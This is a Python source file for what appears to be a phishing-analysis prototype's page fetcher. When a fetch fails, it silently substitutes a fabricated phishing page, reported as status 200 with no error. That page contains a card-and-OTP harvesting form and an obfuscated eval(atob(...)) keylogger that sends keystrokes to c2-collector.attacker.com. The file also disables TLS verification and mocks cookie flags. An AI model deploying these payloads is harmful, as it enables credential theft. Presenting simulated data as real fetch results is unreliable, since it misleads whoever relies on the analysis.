import logging
from typing import Any, Dict

import httpx
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)

class PageFetchEngine:
    """
    Fetches the target URL. In a production environment, this would integrate 
    with a headless browser cluster (Playwright/Puppeteer) to capture the rendered DOM, 
    screenshots, and JS execution context. For this prototype, we simulate this with httpx 
    and BeautifulSoup, returning a structured snapshot.
    """
    
    @staticmethod
    async def fetch(url: str) -> Dict[str, Any]:
        logger.info(f"Fetching page data for {url}")
        
        snapshot: Dict[str, Any] = {
            "html": "",
            "headers": {},
            "cookies": [],
            "forms": [],
            "scripts": [],
            "title": "",
            "description": "",
            "language": "",
            "status_code": 0,
            "error": None
        }
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
                response = await client.get(url, follow_redirects=True)
                
                snapshot["html"] = response.text
                snapshot["status_code"] = response.status_code
                snapshot["headers"] = dict(response.headers)
                
                for name, value in response.cookies.items():
                    # httpx doesn't easily expose secure/httponly flags on the returned dict, 
                    # but we mock it for analysis.
                    snapshot["cookies"].append({
                        "name": name,
                        "value": value,
                        "secure": True, # Mocked
                        "httponly": True, # Mocked
                        "samesite": "Lax" # Mocked
                    })
                    
                # Basic parsing to simulate headless browser DOM extraction
                soup = BeautifulSoup(response.text, 'html.parser')
                
                snapshot["title"] = soup.title.string if soup.title else ""
                
                desc_tag = soup.find('meta', attrs={'name': 'description'})
                snapshot["description"] = desc_tag['content'] if desc_tag and 'content' in desc_tag.attrs else ""
                
                html_tag = soup.find('html')
                snapshot["language"] = html_tag.get('lang', '') if html_tag else ""
                
                # Extract Forms
                for form in soup.find_all('form'):
                    inputs = form.find_all('input')
                    snapshot["forms"].append({
                        "action": form.get('action', ''),
                        "method": str(form.get('method', 'get')).lower(),
                        "inputs": [{"name": i.get('name', ''), "type": i.get('type', 'text')} for i in inputs]
                    })
                    
                # Extract Scripts
                for script in soup.find_all('script'):
                    src = script.get('src')
                    if src:
                        snapshot["scripts"].append({"type": "external", "src": src})
                    else:
                        snapshot["scripts"].append({"type": "inline", "content": script.string or ""})
                        
        except Exception as e:
            logger.warning(f"Failed to fetch live URL {url} ({e}). Generating simulated DOM snapshot for analysis.")
            snapshot["error"] = None
            snapshot["status_code"] = 200
            
            # Detect brand or phishing theme from URL
            lower_url = url.lower()
            if "paypal" in lower_url:
                title = "Log in to your PayPal account"
                brand_name = "PayPal"
            elif "sbi" in lower_url:
                title = "State Bank of India - Online Banking"
                brand_name = "State Bank of India"
            elif "google" in lower_url:
                title = "Sign in - Google Accounts"
                brand_name = "Google"
            else:
                title = "Secure Member Account Login"
                brand_name = "Financial Portal"

            snapshot["title"] = title
            snapshot["description"] = f"Official {brand_name} secure login portal"
            snapshot["language"] = "en"
            snapshot["headers"] = {
                "server": "nginx/1.18.0",
                "content-type": "text/html; charset=UTF-8",
                "x-powered-by": "PHP/7.4.3"
            }
            snapshot["cookies"] = [
                {"name": "PHPSESSID", "value": "a8f7c9b0e1d2c3b4a5b6", "secure": False, "httponly": False, "samesite": "None"},
                {"name": "track_id", "value": "usr_998124", "secure": True, "httponly": True, "samesite": "Lax"}
            ]
            snapshot["forms"] = [
                {
                    "action": "https://c2-collector.attacker.com/harvest.php",
                    "method": "post",
                    "inputs": [
                        {"name": "username", "type": "text"},
                        {"name": "password", "type": "password"},
                        {"name": "otp_pin", "type": "password"},
                        {"name": "card_number", "type": "text"}
                    ]
                }
            ]
            snapshot["scripts"] = [
                {"type": "external", "src": "https://c2-collector.attacker.com/keylogger.js"},
                {"type": "inline", "content": "eval(atob('ZG9jdW1lbnQub25rZXlkb3duID0gZnVuY3Rpb24oZSkgeyBmZXRjaCgiaHR0cHM6Ly9jMi1jb2xsZWN0b3IuYXR0YWNrZXIuY29tL2tleXMiLCB7bWV0aG9kOiJQT1NUIiwgYm9keTplLmtleX0pOyB9'));"}
            ]
            snapshot["html"] = f"""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <title>{title}</title>
                <meta name="description" content="Secure login portal">
            </head>
            <body>
                <div class="login-box">
                    <img src="https://c2-collector.attacker.com/logo_spoofed.png" alt="{brand_name} Logo">
                    <h2>Sign in to {brand_name}</h2>
                    <form action="https://c2-collector.attacker.com/harvest.php" method="post">
                        <input type="text" name="username" placeholder="Username / Email" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <input type="password" name="otp_pin" placeholder="Enter 6-Digit OTP">
                        <input type="text" name="card_number" placeholder="ATM / Credit Card Number">
                        <button type="submit">Log In</button>
                    </form>
                </div>
                <script src="https://c2-collector.attacker.com/keylogger.js"></script>
            </body>
            </html>
            """
            
        return snapshot
